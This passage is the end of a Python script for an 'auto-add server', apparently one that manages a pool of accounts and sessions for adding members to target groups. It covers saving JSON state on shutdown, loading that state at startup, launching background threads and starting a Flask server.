    save_json(SETTINGS_FILE, auto_add_settings)
    save_json(STATS_FILE, stats)
    save_json(WORKER_ADDS_FILE, dict(worker_adds))
    save_temp_sessions()
    save_auto_sessions()
    save_user_map()
    logger.info("Data saved. Exiting.")
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    try:
        accounts.extend(load_json(ACCOUNTS_FILE, []))
        auto_add_settings.update(load_json(SETTINGS_FILE, {}))
        stats_data = load_json(STATS_FILE, {})
        if stats_data:
            stats.update(stats_data)
        worker_adds_data = load_json(WORKER_ADDS_FILE, {})
        if worker_adds_data:
            worker_adds.update(worker_adds_data)
        load_temp_sessions()
        load_auto_sessions()
        load_user_map()
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║       AUTO-ADD SERVER #{SERVER_NUMBER} - {SERVER_NAME} (AUTO MODE)              ║
╠══════════════════════════════════════════════════════════════╣
║  API ID: {API_ID}                                                 ║
║  Targets: {', '.join(TARGET_GROUPS)}                    ║
║  Port: {PORT}                                                   ║
║  Features: Auto-Detect, Quick Verify, Persistent Sessions       ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
        threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
        threading.Thread(target=periodic_health_check, daemon=True, name="health_check").start()
        
        try:
            app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
        except Exception as e:
            logger.critical(f"Flask server error: {e}")
            log_error("Flask server", e)
            save_json(ACCOUNTS_FILE, accounts)
            save_json(SETTINGS_FILE, auto_add_settings)
            save_json(STATS_FILE, stats)
            raise
            
    except Exception as e:
        logger.critical(f"Fatal startup error: {e}")
        log_error("Startup", e)
        try:
            save_json(ACCOUNTS_FILE, accounts)
            save_json(SETTINGS_FILE, auto_add_settings)
            save_json(STATS_FILE, stats)
        except:
            pass
        sys.exit(1)
